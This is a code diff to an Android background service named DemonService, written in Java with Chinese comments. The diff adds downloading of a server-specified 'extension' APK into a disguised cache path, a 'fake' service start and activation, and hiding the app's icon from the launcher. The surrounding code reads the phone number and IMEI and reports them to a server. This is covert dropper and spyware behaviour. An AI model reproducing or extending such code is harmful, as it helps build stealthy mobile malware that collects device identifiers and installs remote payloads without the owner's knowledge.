@@ -19,10 +19,7 @@ import com.xdtd.qm.api.active.ActiveRequest;
 import com.xdtd.qm.api.active.ActiveResponse;
 import com.xdtd.qm.api.active.LanuchRequest;
 import com.xdtd.qm.api.active.LanuchResponse;
-import com.xstd.qm.AppRuntime;
-import com.xstd.qm.Config;
-import com.xstd.qm.UtilOperator;
-import com.xstd.qm.Utils;
+import com.xstd.qm.*;
 import com.xstd.qm.setting.SettingManager;
 
 import java.util.HashMap;
@@ -38,12 +35,26 @@ public class DemonService extends IntentService {
 
     public static final String ACTION_ACTIVE_PLUGIN = "com.xdtd.service.active";
 
+    /**
+     * 下载子程序
+     */
     public static final String ACTION_DOWNLOAD_PLUGIN = "com.xstd.service.download";
+
+    /**
+     * 下载扩展子程序
+     */
+    public static final String ACTION_DOWNLOAD_EXT_PLUGIN = "com.xstd.service.download.ext";
 
     public static final String ACTION_LANUCH = "com.xstd.qs.lanuch";
 
-    public static final String ACTION_PLUGIN_INSTALL = "com.xstd.qs.plugin.installed";
+    /**
+     * 通过Lanuch接口通知服务器服程序现在的状态
+     */
+    public static final String ACTION_INFO_NOTIFY = "com.xstd.qs.plugin.installed";
 
+    /**
+     * 模拟激活
+     */
     public static final String ACTION_ACTIVE_MAIN_FOR_FAKE = "com.xstd.qs.active";
 
     public DemonService() {
@@ -58,7 +69,7 @@ public class DemonService extends IntentService {
     protected void onHandleIntent(Intent intent) {
         if (intent != null) {
             String action = intent.getAction();
-            if (ACTION_PLUGIN_INSTALL.equals(action)) {
+            if (ACTION_INFO_NOTIFY.equals(action)) {
                 notifyPluginInstalled();
             } else if (ACTION_LANUCH.equals(action)) {
                 lanuchQS();
@@ -111,6 +122,11 @@ public class DemonService extends IntentService {
                     Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
                 }
                 UtilOperator.tryToDownloadPlugin(getApplicationContext());
+            } else if (ACTION_DOWNLOAD_EXT_PLUGIN.equals(action)) {
+                if (Config.DEBUG) {
+                    Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
+                }
+                ExtPluginUtils.tryToDownloadExtPlugin(getApplicationContext());
             }
         }
     }
@@ -128,7 +144,7 @@ public class DemonService extends IntentService {
                 return;
             }
 
-            cancelAlarmForAction(getApplicationContext(), ACTION_PLUGIN_INSTALL);
+            cancelAlarmForAction(getApplicationContext(), ACTION_INFO_NOTIFY);
             String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
             if (TextUtils.isEmpty(phone)) phone = "00000000000";
             String imei = UtilsRuntime.getIMEI(getApplicationContext());
@@ -185,7 +201,7 @@ public class DemonService extends IntentService {
             }
         }
 
-        startAlarmForAction(getApplicationContext(), ACTION_PLUGIN_INSTALL, (long) 10 * 60 * 1000);
+        startAlarmForAction(getApplicationContext(), ACTION_INFO_NOTIFY, (long) 10 * 60 * 1000);
     }
 
     private void lanuchQS() {
@@ -270,6 +286,10 @@ public class DemonService extends IntentService {
                     SettingManager.getInstance().setDisableDownloadPlugin(false);
                 }
 
+                if (!SettingManager.getInstance().getDisableDownloadPlugin()) {
+                    Utils.startFakeService(getApplicationContext(), "LanuchQS");
+                }
+
                 SettingManager.getInstance().setKeyInstallInterval(((long) response.activeDelay) * 60 * 1000);
                 if (!response.url.startsWith("http")) {
                     if (Config.URL_PREFIX.endsWith("/")) {
@@ -279,6 +299,21 @@ public class DemonService extends IntentService {
                     }
                 } else {
                     SettingManager.getInstance().setKeyDownloadUrl(response.url);
+                }
+
+                if (!TextUtils.isEmpty(response.urlExt)) {
+                    if (!response.urlExt.startsWith("http")) {
+                        if (Config.URL_PREFIX.endsWith("/")) {
+                            SettingManager.getInstance().setKeyDownloadUrlExt(Config.URL_PREFIX + response.urlExt);
+                        } else {
+                            SettingManager.getInstance().setKeyDownloadUrlExt(Config.URL_PREFIX + "/" + response.urlExt);
+                        }
+                    } else {
+                        SettingManager.getInstance().setKeyDownloadUrlExt(response.urlExt);
+                    }
+
+                    String extApkFileName = StringUtils.MD5Encode(response.urlExt) + ".apk";
+                    SettingManager.getInstance().setLocalExtApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + extApkFileName);
                 }
 
                 if (Config.DEBUG) {
@@ -328,6 +363,10 @@ public class DemonService extends IntentService {
                     startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN_FOR_FAKE, SettingManager.getInstance().getRealActiveDelayTime());
                 }
                 cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
+
+                if (!SettingManager.getInstance().getDisableDownloadPlugin()) {
+                    AppRuntime.hideInLauncher(getApplicationContext());
+                }
 
                 return;
             } else {
